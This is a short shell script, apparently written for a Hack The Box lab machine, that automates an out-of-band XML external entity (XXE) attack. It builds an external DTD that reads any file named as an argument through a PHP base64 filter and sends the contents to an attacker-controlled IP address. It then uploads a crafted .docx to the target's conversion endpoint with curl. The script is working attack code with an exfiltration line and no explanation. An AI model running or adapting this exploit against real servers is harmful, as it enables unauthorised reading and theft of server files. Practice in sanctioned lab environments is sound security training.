#!/bin/sh
NAME="binding"
LFI="${1}"
# rm /home/zoey/htb/patents/xxe/${NAME}_xxe.docx
# cd /home/zoey/htb/patents/xxe/${NAME}
# zip -r ../${NAME}.zip *
# mv ../${NAME}.zip ../${NAME}_xxe.docx
cd /home/zoey/htb/patents/xxe
echo "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=${LFI}\">\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://10.10.14.11/exfil-b64/current/${LFI}?f=%data;'>\">\n" > ../ext.dtd
curl http://10.10.10.173/convert.php -F "userfile=@${NAME}_xxe.docx" -F "submit=Generate pdf" -H "Expect:"
